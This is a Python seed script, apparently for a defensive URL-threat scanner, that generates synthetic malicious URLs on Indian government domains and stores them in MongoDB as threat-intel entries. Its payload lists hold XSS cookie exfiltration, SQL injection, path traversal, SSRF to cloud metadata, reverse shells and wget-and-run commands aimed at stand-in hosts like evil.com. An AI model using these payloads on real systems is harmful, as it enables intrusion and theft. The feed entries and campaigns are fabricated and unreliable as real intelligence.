"""Seed threat_intel_feeds with 1000+ URLs that have legitimate base domains
but suspicious payloads, paths, and query parameters.

Campaign-aware seeding: threat intel entries are organised into pre-defined
campaigns so their embeddings already carry campaign context.  Future URL
scans against these entries will naturally resolve to the right campaign via
single-query vector search neighbor consensus.

Usage:
    cd backend
    poetry run python -m scripts.seed_threat_intel
"""

import asyncio
import os
import random
import logging
import urllib.parse
from datetime import datetime, timedelta

from dotenv import load_dotenv
from motor.motor_asyncio import AsyncIOMotorClient

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
DB_NAME = os.getenv("DB_NAME", "shieldnet-ai")

# ── Legitimate Indian Government base domains ──────────────────────────
LEGIT_DOMAINS = [
    "nic.in", "india.gov.in", "incometax.gov.in", "epfindia.gov.in",
    "digilocker.gov.in", "cowin.gov.in", "irctc.co.in", "passportindia.gov.in",
    "gst.gov.in", "pensionersportal.gov.in", "nrega.nic.in",
    "scholarships.gov.in", "edistrict.up.gov.in", "digitalindia.gov.in",
    "meity.gov.in", "cert-in.org.in", "data.gov.in", "mygov.in",
    "uidai.gov.in", "pmjay.gov.in", "nhp.gov.in", "ugc.ac.in",
    "cbse.gov.in", "nta.ac.in", "rbi.org.in", "sebi.gov.in",
    "ecourts.gov.in", "nvsp.in", "umang.gov.in", "parivahan.gov.in",
    "vahan.parivahan.gov.in", "sarathi.parivahan.gov.in",
    "pfms.nic.in", "Jan Dhan portal", "pmkisan.gov.in",
    "swachh.city", "rera.gov.in", "antodaya.gov.in",
    "sso.rajasthan.gov.in", "tnpsc.gov.in", "uppsc.up.nic.in",
]

# ── Legitimate-looking paths that real gov sites use ──────────────────
LEGIT_PATHS = [
    "/citizen/login", "/e-filing/portal", "/services/apply",
    "/dashboard/home", "/verify/certificate", "/download/receipt",
    "/payment/gateway", "/registration/new", "/status/check",
    "/grievance/submit", "/aadhaar/verify", "/pan/link",
    "/ekyc/otp", "/forms/download", "/appointment/book",
    "/results/view", "/admit-card/download", "/scholarship/apply",
    "/pension/status", "/epf/balance", "/gst/return-filing",
    "/passport/track", "/voter-id/apply", "/driving-license/renew",
]

# ── Suspicious payloads injected into query params ────────────────────

# XSS payloads
XSS_PAYLOADS = [
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<img src=x onerror=fetch('https://attacker.xyz/log?d='+document.domain)>",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    "javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9ldmlsLmNvbS8nK2RvY3VtZW50LmNvb2tpZQ=='))",
    "'><script>new Image().src='http://evil.com/grab?c='+document.cookie</script>",
    "<iframe src='javascript:alert(`XSS`)' style='display:none'>",
    "<body onload=window.open('http://phish.xyz/'+document.cookie)>",
    "\"><script>fetch('https://c2.evil.com/exfil',{method:'POST',body:document.cookie})</script>",
    "<input onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
    "<details/open/ontoggle=fetch('//evil.com?c='+document.cookie)>",
]

# SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "1; DROP TABLE users; --",
    "' UNION SELECT username, password FROM admin_users --",
    "admin'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR 1=1 UNION SELECT null, table_name FROM information_schema.tables --",
    "'; EXEC xp_cmdshell('net user hacker P@ss123 /add'); --",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--",
    "' UNION ALL SELECT NULL,NULL,CONCAT(username,':',password) FROM users--",
    "1'; WAITFOR DELAY '00:00:05'--",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/shadow",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%252e%252e%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/proc/self/environ",
    "....//....//....//var/log/auth.log",
    "..%00/etc/passwd",
    "/etc/shadow%00.jpg",
]

# Command injection payloads
CMD_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh",
    "`curl http://c2.attacker.com/beacon`",
    "$(nc -e /bin/sh attacker.com 4444)",
    "; ping -c 10 attacker.com",
    "| nslookup $(whoami).attacker.com",
    "&& curl -d @/etc/passwd http://evil.com/collect",
    "| python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"evil.com\",9999));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno())'",
    "; base64 /etc/shadow | curl -d @- http://evil.com/exfil",
    "$(wget -q -O- http://evil.com/malware.sh|sh)",
]

# Suspicious redirect/phishing URLs in parameters
REDIRECT_PAYLOADS = [
    "http://gov-login-verify.xyz/capture",
    "https://secure-aadhaar-update.tk/phish",
    "http://tax-refund-claim.ml/form",
    "https://india-gov-auth.club/login",
    "http://ministry-verify.top/credential",
    "https://epfo-kyc-update.buzz/steal",
    "http://digilocker-auth.monster/fake",
    "https://cowin-booster.rest/inject",
    "http://irctc-refund-process.fit/scam",
    "https://passport-renewal-fast.cam/harvest",
    "http://gst-portal-verify.ga/clone",
    "https://pension-update-urgent.cf/trap",
    "http://scholarship-grant.gq/lure",
    "https://nrega-payment-fast.icu/grab",
    "http://digital-india-bonus.work/fake-portal",
]

# SSRF / internal network access payloads
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:22",
    "http://[::1]/admin",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/latest/user-data",
    "http://internal-api.local/v1/secrets",
    "http://10.0.0.1/admin/config",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "dict://127.0.0.1:11211/stats",
]

# Encoded/obfuscated suspicious paths
OBFUSCATED_PATHS = [
    "/%2e%2e/%2e%2e/etc/passwd",
    "/..%252f..%252f..%252fetc/shadow",
    "/admin/..;/manager/html",
    "/.git/config",
    "/.env",
    "/.aws/credentials",
    "/wp-admin/admin-ajax.php",
    "/cgi-bin/test-cgi",
    "/server-status",
    "/actuator/env",
    "/api/v1/../../admin/users",
    "/graphql?query={__schema{types{name}}}",
    "/debug/pprof/",
    "/console",
    "/.well-known/openid-configuration/../../../etc/passwd",
]

# Base64-encoded payloads in parameters
B64_PAYLOADS = [
    "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",  # <script>alert(1)</script>
    "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=",  # curl http://evil.com/shell.sh
    "d2dldCAtcSBodHRwOi8vYzIuYXR0YWNrZXIuY29tL21hbHdhcmU=",  # wget malware
    "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ==",  # reverse shell
    "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=",  # import os; os.system('id')
]

FEED_NAMES = [
    "PhishTank", "OpenPhish", "NIC_Internal", "CERT-IN_Feed",
    "AlienVault_OTX", "VirusTotal", "URLhaus", "Google_SafeBrowsing",
    "MalwareBazaar", "ThreatFox", "Spamhaus", "Cisco_Talos",
]

THREAT_TYPES = ["phishing", "malware", "c2"]


def random_date(start_days_ago: int = 180, end_days_ago: int = 0) -> datetime:
    delta = random.randint(end_days_ago, start_days_ago)
    return datetime.utcnow() - timedelta(
        days=delta, hours=random.randint(0, 23), minutes=random.randint(0, 59)
    )


def build_xss_url() -> tuple[str, str, str, str, str]:
    """Legit domain + XSS payload in query param."""
    domain = random.choice(LEGIT_DOMAINS)
    path = random.choice(LEGIT_PATHS)
    param_name = random.choice(["q", "search", "query", "name", "callback", "redirect", "ref", "input", "value", "data"])
    payload = random.choice(XSS_PAYLOADS)
    url = f"https://{domain}{path}?{param_name}={urllib.parse.quote(payload)}"
    desc = f"XSS injection attempt via '{param_name}' parameter on {domain}{path}. Payload attempts to exfiltrate cookies/session data to external attacker-controlled server."
    return url, desc, "malware", "xss", domain


def build_sqli_url() -> tuple[str, str, str, str, str]:
    """Legit domain + SQL injection in query param."""
    domain = random.choice(LEGIT_DOMAINS)
    path = random.choice(LEGIT_PATHS)
    param_name = random.choice(["id", "uid", "user", "ref", "page", "cat", "item", "order", "sort", "filter"])
    payload = random.choice(SQLI_PAYLOADS)
    url = f"https://{domain}{path}?{param_name}={urllib.parse.quote(payload)}"
    desc = f"SQL injection attempt targeting {domain}{path} via '{param_name}' parameter. Payload tries to extract sensitive data or manipulate database queries on the government portal."
    return url, desc, "malware", "sqli", domain


def build_path_traversal_url() -> tuple[str, str, str, str, str]:
    """Legit domain + path traversal to access system files."""
    domain = random.choice(LEGIT_DOMAINS)
    path_prefix = random.choice(["/download/file", "/api/v1/document", "/static/resource", "/export/report", "/attachment/view"])
    payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
    param = random.choice(["file", "path", "doc", "name", "resource", "template"])
    url = f"https://{domain}{path_prefix}?{param}={urllib.parse.quote(payload)}"
    desc = f"Path traversal attack on {domain} attempting to read system files via '{param}' parameter. Attacker tries to escape web root and access /etc/passwd or other sensitive OS files."
    return url, desc, "malware", "path_traversal", domain


def build_cmd_injection_url() -> tuple[str, str, str, str, str]:
    """Legit domain + command injection in parameters."""
    domain = random.choice(LEGIT_DOMAINS)
    path = random.choice(["/api/v1/ping", "/tools/lookup", "/admin/diagnostic", "/services/check", "/api/health"])
    param = random.choice(["host", "target", "ip", "domain", "url", "cmd", "action"])
    payload = random.choice(CMD_INJECTION_PAYLOADS)
    url = f"https://{domain}{path}?{param}={urllib.parse.quote(payload)}"
    desc = f"OS command injection attempt on {domain}{path} via '{param}' parameter. Payload attempts remote code execution or reverse shell to attacker infrastructure."
    return url, desc, "c2", "command_injection", domain


def build_open_redirect_url() -> tuple[str, str, str, str, str]:
    """Legit domain with redirect to phishing site."""
    domain = random.choice(LEGIT_DOMAINS)
    redirect_param = random.choice(["redirect", "url", "next", "return", "goto", "continue", "redir", "returnUrl", "target", "dest"])
    path = random.choice(["/auth/login", "/sso/callback", "/oauth/authorize", "/logout", "/session/new"])
    target = random.choice(REDIRECT_PAYLOADS)
    url = f"https://{domain}{path}?{redirect_param}={urllib.parse.quote(target)}"
    desc = f"Open redirect on {domain} abused to redirect government employees to phishing site {target.split('/')[2]}. Legitimate SSO/auth flow hijacked to harvest credentials."
    return url, desc, "phishing", "open_redirect", domain


def build_ssrf_url() -> tuple[str, str, str, str, str]:
    """Legit domain + SSRF payload to probe internal networks."""
    domain = random.choice(LEGIT_DOMAINS)
    path = random.choice(["/api/v1/fetch", "/proxy/load", "/webhook/test", "/import/url", "/preview/link"])
    param = random.choice(["url", "target", "uri", "src", "link", "endpoint"])
    payload = random.choice(SSRF_PAYLOADS)
    url = f"https://{domain}{path}?{param}={urllib.parse.quote(payload)}"
    desc = f"SSRF attack via {domain}{path} attempting to access internal infrastructure through '{param}' parameter. Targets cloud metadata endpoints or internal services."
    return url, desc, "c2", "ssrf", domain


def build_obfuscated_path_url() -> tuple[str, str, str, str, str]:
    """Legit domain with encoded/obfuscated suspicious paths."""
    domain = random.choice(LEGIT_DOMAINS)
    path = random.choice(OBFUSCATED_PATHS)
    url = f"https://{domain}{path}"
    desc = f"Obfuscated path access on {domain} using encoded characters to bypass WAF/filters. Attempts to access sensitive configuration files, admin panels, or debug endpoints."
    return url, desc, random.choice(["malware", "c2"]), "obfuscated_path", domain


def build_b64_payload_url() -> tuple[str, str, str, str, str]:
    """Legit domain with base64-encoded malicious payload in params."""
    domain = random.choice(LEGIT_DOMAINS)
    path = random.choice(LEGIT_PATHS)
    param = random.choice(["data", "payload", "token", "state", "code", "enc"])
    payload = random.choice(B64_PAYLOADS)
    url = f"https://{domain}{path}?{param}={payload}"
    desc = f"Base64-encoded malicious payload submitted to {domain}{path} via '{param}' parameter. Decoded content contains script injection or remote code execution attempt."
    return url, desc, random.choice(["malware", "c2"]), "base64_payload", domain


def build_credential_harvest_url() -> tuple[str, str, str, str, str]:
    """Legit domain lookalike with credential-stealing form action."""
    domain = random.choice(LEGIT_DOMAINS)
    path = random.choice(["/login", "/auth/verify", "/ekyc/otp", "/registration/new"])
    # Suspicious form action or exfil endpoint hidden in fragment/param
    exfil = random.choice([
        "formAction=http://gov-login-steal.xyz/collect",
        "webhook=https://attacker.com/api/creds",
        "postback=http://fake-nic.tk/harvest",
        "notify=https://evil-portal.ml/grab",
        "callback=http://phish-gov.top/store",
    ])
    url = f"https://{domain}{path}?{exfil}&session={random.randint(100000, 999999)}"
    desc = f"Credential harvesting attempt using {domain}{path} with suspicious form action parameter pointing to attacker-controlled domain. Intercepts login credentials submitted by government employees."
    return url, desc, "phishing", "credential_harvest", domain


def build_malware_download_url() -> tuple[str, str, str, str, str]:
    """Legit domain path leading to suspicious file downloads."""
    domain = random.choice(LEGIT_DOMAINS)
    suspicious_files = [
        "update.exe", "patch.scr", "document.js.exe", "form.pdf.bat",
        "certificate.docm", "receipt.xlsm", "notice.hta", "circular.vbs",
        "advisory.ps1", "report.jar", "memo.msi", "invoice.wsf",
        "salary-slip.cmd", "transfer-letter.pif", "appointment.com",
    ]
    file = random.choice(suspicious_files)
    path = random.choice(["/download/attachment", "/documents/circular", "/notices/latest", "/forms/pdf", "/uploads/shared"])
    url = f"https://{domain}{path}/{file}?token={random.randbytes(8).hex()}"
    desc = f"Suspicious executable disguised as government document on {domain}. File '{file}' has double extension or executable format masquerading as a legitimate document download."
    return url, desc, "malware", "malware_download", domain


def build_typosquat_subdomain_url() -> tuple[str, str, str, str, str]:
    """Legit-looking domain with suspicious subdomain prefix."""
    domain = random.choice(LEGIT_DOMAINS)
    suspicious_sub = random.choice([
        "secure-login", "verify-account", "update-kyc", "urgent-action",
        "confirm-identity", "reset-password", "claim-refund", "auth-portal",
        "validate-otp", "kyc-mandatory", "tax-refund", "bonus-scheme",
        "free-certificate", "emergency-update", "final-notice",
    ])
    path = random.choice(LEGIT_PATHS)
    url = f"https://{suspicious_sub}.{domain}{path}"
    desc = f"Suspicious subdomain '{suspicious_sub}' prepended to legitimate domain {domain}. Social engineering tactic to create urgency and trick government employees into providing credentials."
    return url, desc, "phishing", "typosquat_subdomain", domain


def build_dns_tunneling_url() -> tuple[str, str, str, str, str]:
    """URLs with DNS tunneling / data exfiltration patterns."""
    domain = random.choice(LEGIT_DOMAINS)
    # DNS tunneling encodes data in long subdomain labels
    encoded_data = ''.join(random.choices("abcdef0123456789", k=random.randint(30, 60)))
    chunks = [encoded_data[i:i+15] for i in range(0, len(encoded_data), 15)]
    tunnel_domain = ".".join(chunks) + f".dns-tunnel-{random.randint(1,99)}.xyz"
    path = random.choice(["/api/v1/resolve", "/dns/lookup", "/network/check"])
    param = random.choice(["host", "target", "resolve", "query"])
    url = f"https://{domain}{path}?{param}={tunnel_domain}"
    desc = f"DNS tunneling attempt via {domain}{path} using encoded subdomain labels to exfiltrate data through DNS queries. Long hex-encoded subdomain chain '{'.'.join(chunks[:2])}...' indicates covert data channel to attacker nameserver."
    return url, desc, "c2", "dns_tunneling", domain


def build_cryptomining_url() -> tuple[str, str, str, str, str]:
    """URLs injecting cryptomining scripts."""
    domain = random.choice(LEGIT_DOMAINS)
    miners = [
        "coinhive.min.js", "cryptonight.wasm", "deepMiner.js",
        "coin-hive.com/lib/coinhive.min.js", "webmr.js",
        "miner.start()", "crypto-loot.com/lib/miner.min.js",
    ]
    miner = random.choice(miners)
    path = random.choice(["/assets/js", "/static/scripts", "/cdn/lib", "/resources/vendor"])
    url = f"https://{domain}{path}/{miner}?v={random.randint(1,99)}"
    desc = f"Cryptomining script injection on {domain}. Malicious JavaScript miner '{miner}' hijacks visitor CPU cycles for unauthorized cryptocurrency mining. Commonly injected via compromised CMS or supply chain attack."
    return url, desc, "malware", "cryptomining", domain


def build_api_abuse_url() -> tuple[str, str, str, str, str]:
    """URLs targeting API endpoints for data extraction."""
    domain = random.choice(LEGIT_DOMAINS)
    api_endpoints = [
        "/api/v1/users/export?format=csv&limit=999999",
        "/api/v2/records/bulk-download?all=true",
        "/graphql?query={users{email,aadhaar,phone,pan}}",
        "/api/internal/admin/dump?table=citizens",
        "/rest/v1/search?q=*&fields=name,mobile,aadhaar&size=10000",
        "/api/v1/beneficiaries/list?state=all&download=true",
        "/odata/v1/PersonalData?$select=Name,PAN,Phone&$top=50000",
    ]
    endpoint = random.choice(api_endpoints)
    url = f"https://{domain}{endpoint}"
    desc = f"API abuse attempt on {domain} — mass data extraction via {endpoint.split('?')[0]}. Unauthorized bulk query designed to exfiltrate citizen PII (Aadhaar, PAN, phone numbers) from government database API endpoints."
    return url, desc, "malware", "api_abuse", domain


def build_supply_chain_url() -> tuple[str, str, str, str, str]:
    """URLs mimicking compromised package repositories or CDNs."""
    domain = random.choice(LEGIT_DOMAINS)
    packages = [
        "npm/gov-auth-helper/1.0.1/index.js",
        "pypi/aadhaar-utils/2.3.0/aadhaar_utils.tar.gz",
        "maven/in.gov.common/auth-sdk/3.1.0/auth-sdk.jar",
        "cdn/jquery-3.6.1.min.js",  # typosquat of 3.6.0
        "gems/rails-gov-toolkit-0.9.1.gem",
        "nuget/GovPortal.Auth/1.2.3/GovPortal.Auth.nupkg",
    ]
    pkg = random.choice(packages)
    url = f"https://{domain}/vendor/{pkg}?integrity=sha384-{random.randbytes(12).hex()}"
    desc = f"Supply chain attack via compromised package on {domain}. Backdoored dependency '{pkg.split('/')[1]}' injected into government portal build pipeline. Package contains obfuscated reverse shell that activates on import."
    return url, desc, "malware", "supply_chain", domain


def build_watering_hole_url() -> tuple[str, str, str, str, str]:
    """URLs representing compromised legitimate sites targeting gov users."""
    domain = random.choice(LEGIT_DOMAINS)
    watering_paths = [
        "/news/latest-circular.html",
        "/events/annual-conference-2024.html",
        "/downloads/training-material.html",
        "/resources/policy-update.html",
        "/announcements/recruitment-notification.html",
    ]
    path = random.choice(watering_paths)
    exploit_kit = random.choice(["RIG", "Magnitude", "Fallout", "GreenFlash", "Underminer"])
    url = f"https://{domain}{path}?utm_source=email&ref={random.randbytes(6).hex()}"
    desc = f"Watering hole attack on {domain}{path}. Legitimate government page compromised with {exploit_kit} exploit kit. Targets government employees visiting routine pages — iframe injection redirects to drive-by download payload."
    return url, desc, "malware", "watering_hole", domain


# All URL generators with their relative weights
URL_GENERATORS = [
    (build_xss_url, 120),
    (build_sqli_url, 120),
    (build_path_traversal_url, 100),
    (build_cmd_injection_url, 80),
    (build_open_redirect_url, 130),
    (build_ssrf_url, 80),
    (build_obfuscated_path_url, 80),
    (build_b64_payload_url, 60),
    (build_credential_harvest_url, 100),
    (build_malware_download_url, 80),
    (build_typosquat_subdomain_url, 80),
    (build_dns_tunneling_url, 60),
    (build_cryptomining_url, 60),
    (build_api_abuse_url, 60),
    (build_supply_chain_url, 50),
    (build_watering_hole_url, 50),
]


# Severity mapping by attack category
ATTACK_SEVERITY = {
    "xss": "high",
    "sqli": "critical",
    "path_traversal": "high",
    "command_injection": "critical",
    "open_redirect": "medium",
    "ssrf": "critical",
    "obfuscated_path": "medium",
    "base64_payload": "high",
    "credential_harvest": "high",
    "malware_download": "critical",
    "typosquat_subdomain": "medium",
    "dns_tunneling": "critical",
    "cryptomining": "high",
    "api_abuse": "critical",
    "supply_chain": "critical",
    "watering_hole": "critical",
}

# TTL (days) by severity — critical threats persist longer
SEVERITY_TTL = {
    "critical": 180,
    "high": 120,
    "medium": 90,
    "low": 30,
}

# ── Synthetic campaign clusters ──────────────────────────────────────────────
# These are inserted into the campaigns collection during seeding so threat
# intel entries that belong to a campaign carry campaign context in their
# embeddings.  The IDs are simple string keys resolved to ObjectIds at runtime.
SYNTHETIC_CAMPAIGNS = [
    {
        "name": "Banking Phishing Wave Q1",
        "attackCategory": "credential_harvest",
        "threatType": "phishing",
        "severity": "critical",
        "status": "active",
        "urlCount": 35,
        "avgRiskScore": 91.0,
        "avgSimilarity": 0.87,
        "clusterSize": 35,
        "sharedTlds": ["gov", "in", "org"],
        "description": "Large-scale credential harvesting campaign targeting banking and government portal users.",
    },
    {
        "name": "SQL Injection Government DB Campaign",
        "attackCategory": "sqli",
        "threatType": "malware",
        "severity": "critical",
        "status": "active",
        "urlCount": 28,
        "avgRiskScore": 95.0,
        "avgSimilarity": 0.89,
        "clusterSize": 28,
        "sharedTlds": ["gov", "nic", "in"],
        "description": "Automated SQL injection campaign targeting government database endpoints to exfiltrate citizen records.",
    },
    {
        "name": "XSS Session Hijack Campaign",
        "attackCategory": "xss",
        "threatType": "phishing",
        "severity": "high",
        "status": "active",
        "urlCount": 22,
        "avgRiskScore": 85.0,
        "avgSimilarity": 0.84,
        "clusterSize": 22,
        "sharedTlds": ["gov", "in"],
        "description": "Cross-site scripting campaign injecting session-stealing payloads across government portals.",
    },
    {
        "name": "Malware Download Supply Chain Attack",
        "attackCategory": "supply_chain",
        "threatType": "malware",
        "severity": "critical",
        "status": "active",
        "urlCount": 18,
        "avgRiskScore": 94.0,
        "avgSimilarity": 0.91,
        "clusterSize": 18,
        "sharedTlds": ["gov", "org", "in"],
        "description": "Backdoored dependency injection campaign targeting government software supply chain.",
    },
    {
        "name": "SSRF Cloud Metadata Exfiltration Campaign",
        "attackCategory": "ssrf",
        "threatType": "c2",
        "severity": "critical",
        "status": "active",
        "urlCount": 20,
        "avgRiskScore": 93.0,
        "avgSimilarity": 0.88,
        "clusterSize": 20,
        "sharedTlds": ["gov", "cloud", "in"],
        "description": "SSRF attack campaign probing cloud metadata endpoints to harvest cloud credentials and IAM tokens.",
    },
    {
        "name": "Watering Hole Exploit Kit Campaign",
        "attackCategory": "watering_hole",
        "threatType": "malware",
        "severity": "critical",
        "status": "active",
        "urlCount": 15,
        "avgRiskScore": 92.0,
        "avgSimilarity": 0.86,
        "clusterSize": 15,
        "sharedTlds": ["gov", "in", "org"],
        "description": "Watering hole campaign compromising government news and event pages with drive-by download exploit kits.",
    },
    {
        "name": "DNS Tunneling C2 Campaign",
        "attackCategory": "dns_tunneling",
        "threatType": "c2",
        "severity": "high",
        "status": "active",
        "urlCount": 12,
        "avgRiskScore": 88.0,
        "avgSimilarity": 0.85,
        "clusterSize": 12,
        "sharedTlds": ["xyz", "top", "tk"],
        "description": "DNS tunneling campaign using encoded subdomain labels to exfiltrate data through covert DNS channels.",
    },
    {
        "name": "API Mass Data Exfiltration Campaign",
        "attackCategory": "api_abuse",
        "threatType": "malware",
        "severity": "critical",
        "status": "active",
        "urlCount": 16,
        "avgRiskScore": 90.0,
        "avgSimilarity": 0.83,
        "clusterSize": 16,
        "sharedTlds": ["gov", "nic", "in"],
        "description": "Bulk data exfiltration campaign abusing government API endpoints to harvest PII records.",
    },
]

# How many campaign-tagged threat intel entries to generate per campaign
CAMPAIGN_ENTRIES_PER = 25


def generate_feed_entry(campaign: dict = None) -> dict:
    """Generate a single threat intel feed entry with enriched metadata.

    If `campaign` is provided, the entry is force-assigned to that attack
    category and gets campaign context appended to its summaryText before
    embedding, so vector search clusters it near other campaign members.
    """
    generators, weights = zip(*URL_GENERATORS)
    gen_func = random.choices(generators, weights=weights, k=1)[0]
    url, description, threat_type, attack_category, target_domain = gen_func()

    # Override attack category if this entry belongs to a campaign
    if campaign:
        attack_category = campaign["attackCategory"]
        threat_type = campaign.get("threatType", threat_type)
        severity = campaign.get("severity", ATTACK_SEVERITY.get(attack_category, "medium"))
    else:
        severity = ATTACK_SEVERITY.get(attack_category, "medium")

    reported_date = random_date(180)

    feed_name = random.choice(FEED_NAMES)
    confidence = round(random.uniform(0.7, 0.99), 2)
    last_verified = random_date(start_days_ago=30, end_days_ago=0)

    # Extract domain from URL
    from urllib.parse import urlparse
    parsed = urlparse(url)
    domain = parsed.hostname or ""

    entry = {
        # ── Core fields (shared with scan docs) ──────────────────────
        "url": url,
        "domain": domain,
        "docType": "threat_intel",
        "source": f"threat_feed:{feed_name}",
        "submissionDate": reported_date,
        "dnsStatus": "active",
        "hostingFlags": {
            "isSharedHosting": False,
            "isCloudHosted": True,
            "hostingProvider": "unknown",
            "geoLocation": "unknown",
            "sslValid": url.startswith("https"),
            "domainAgeDays": 365,
        },
        "urlStructure": {
            "pathDepth": url.count("/") - 2,
            "hasIpAddress": False,
            "hasSuspiciousTld": False,
            "entropyScore": 0.0,
            "containsEncodedChars": "%" in url,
            "subdomainCount": 0,
        },
        "threatClassification": threat_type,
        "riskScore": 90.0,
        "status": "blocked",
        "reviewedBy": f"threat_feed:{feed_name}",
        "summaryText": "",  # populated below
        "embedding": None,
        "payloadTypes": [attack_category],
        "scanCount": 0,
        "firstSeenAt": reported_date,
        "lastSeenAt": last_verified,
        "createdAt": reported_date,
        "updatedAt": datetime.utcnow(),
        # ── Threat-intel-specific metadata ────────────────────────────
        "feedName": feed_name,
        "description": description,
        "attackCategory": attack_category,
        "targetDomain": target_domain,
        "payloadSignature": attack_category,
        "severity": severity,
        "confidence": confidence,
        "lastVerifiedAt": last_verified,
        "iocType": "url",
        "ttl": SEVERITY_TTL.get(severity, 90),
    }

    from utils.url_feature_extractor import build_threat_intel_text
    base_text = build_threat_intel_text(entry)

    if campaign:
        # Bake campaign context into summaryText so the embedding carries it
        cam_parts = [
            "coordinated attack campaign detected",
            f"campaign name {campaign['name']}",
            f"attack category {attack_category}",
            f"campaign severity {campaign['severity']}",
            f"campaign url count {campaign['urlCount']}",
            f"shared infrastructure TLDs {' '.join(campaign.get('sharedTlds', []))}",
            f"average campaign risk score {campaign.get('avgRiskScore', 90):.0f}",
            f"average cluster similarity {campaign.get('avgSimilarity', 0.85):.2f}",
            f"cluster size {campaign.get('clusterSize', campaign['urlCount'])}",
        ]
        entry["summaryText"] = f"{base_text}, {', '.join(cam_parts)}"
        entry["campaignId"] = campaign["_id"]
        entry["campaignName"] = campaign["name"]
    else:
        entry["summaryText"] = base_text

    return entry


async def seed_threat_intel():
    logger.info("Connecting to MongoDB at %s", MONGODB_URI)
    client = AsyncIOMotorClient(MONGODB_URI)
    db = client[DB_NAME]

    # Remove existing threat intel entries from urls collection
    del_result = await db["urls"].delete_many({"docType": "threat_intel"})
    logger.info("Removed %d existing threat_intel entries from urls collection", del_result.deleted_count)

    # ── Step 1: Create synthetic campaign documents ──────────────────
    from bson import ObjectId
    now = datetime.utcnow()
    logger.info("Creating %d synthetic campaign documents...", len(SYNTHETIC_CAMPAIGNS))

    # Remove previously seeded campaigns (synthetic ones have a description)
    del_camps = await db["campaigns"].delete_many({"description": {"$exists": True}})
    logger.info("Removed %d previously seeded campaigns", del_camps.deleted_count)

    campaigns_by_category: dict[str, dict] = {}
    for camp_def in SYNTHETIC_CAMPAIGNS:
        camp_doc = {
            "_id": ObjectId(),
            "name": camp_def["name"],
            "attackCategory": camp_def["attackCategory"],
            "severity": camp_def["severity"],
            "status": camp_def["status"],
            "urlCount": camp_def["urlCount"],
            "avgRiskScore": camp_def["avgRiskScore"],
            "avgSimilarity": camp_def["avgSimilarity"],
            "clusterSize": camp_def["clusterSize"],
            "sharedTlds": camp_def.get("sharedTlds", []),
            "description": camp_def.get("description", ""),
            "domains": [],
            "urls": [],
            "firstSeen": now - timedelta(days=random.randint(10, 60)),
            "lastSeen": now - timedelta(days=random.randint(0, 5)),
            "createdAt": now,
            "updatedAt": now,
        }
        await db["campaigns"].insert_one(camp_doc)
        camp_def["_id"] = camp_doc["_id"]
        campaigns_by_category[camp_def["attackCategory"]] = camp_def
        logger.info("  Created campaign: %s (%s)", camp_doc["name"], camp_doc["_id"])

    # ── Step 2: Generate campaign-tagged entries ─────────────────────
    campaign_entries: list[dict] = []
    for camp in SYNTHETIC_CAMPAIGNS:
        for _ in range(CAMPAIGN_ENTRIES_PER):
            entry = generate_feed_entry(campaign=camp)
            campaign_entries.append(entry)
    logger.info("Generated %d campaign-tagged threat intel entries", len(campaign_entries))

    # ── Step 3: Generate regular (non-campaign) entries ───────────────
    NUM_ENTRIES = 1100
    feeds = [generate_feed_entry() for _ in range(NUM_ENTRIES)]
    logger.info("Generated %d generic threat intel entries", len(feeds))

    # Merge all entries
    all_feeds = campaign_entries + feeds

    # Deduplicate by URL
    seen_urls = set()
    unique_feeds = []
    for f in all_feeds:
        if f["url"] not in seen_urls:
            seen_urls.add(f["url"])
            unique_feeds.append(f)
    feeds = unique_feeds
    logger.info("Deduped to %d unique threat intel feed entries", len(feeds))

    # Generate embeddings if Voyage AI key is available
    voyage_key = os.getenv("VOYAGE_AI_API_KEY")
    generate_embeddings = voyage_key and voyage_key != "your_voyage_ai_api_key" and os.getenv("SKIP_EMBEDDINGS", "").lower() != "true"

    if generate_embeddings:
        logger.info("Generating embeddings via Voyage AI...")
        import httpx

        from utils.url_feature_extractor import build_threat_intel_text
        embed_texts = [f["summaryText"] for f in feeds]
        batch_size = 128
        all_embeddings = []

        try:
            async with httpx.AsyncClient() as http_client:
                for i in range(0, len(embed_texts), batch_size):
                    batch = embed_texts[i : i + batch_size]
                    logger.info("  Embedding batch %d-%d of %d", i + 1, i + len(batch), len(embed_texts))
                    resp = await http_client.post(
                        "https://ai.mongodb.com/v1/embeddings",
                        headers={
                            "Authorization": f"Bearer {voyage_key}",
                            "Content-Type": "application/json",
                        },
                        json={"input": batch, "model": os.getenv("VOYAGE_MODEL", "voyage-4")},
                        timeout=120.0,
                    )
                    resp.raise_for_status()
                    data = resp.json()
                    all_embeddings.extend(item["embedding"] for item in data["data"])

            for feed, emb in zip(feeds, all_embeddings):
                feed["embedding"] = emb
